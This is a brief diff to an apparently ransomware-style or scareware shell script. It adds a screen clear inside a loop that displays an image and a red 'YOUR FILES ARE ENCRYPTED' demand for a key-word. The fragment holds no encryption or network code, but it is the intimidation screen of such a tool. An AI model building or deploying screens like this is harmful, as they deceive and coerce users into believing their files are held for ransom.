@@ -12,7 +12,7 @@ sed -i '9s/echo/#/' install.sh || sed -i '10s/echo/#/' install.sh
 sleep 1
 while :
 do
-	
+	clear
 	termimage 1705743575411.png
  	echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
   	echo ""
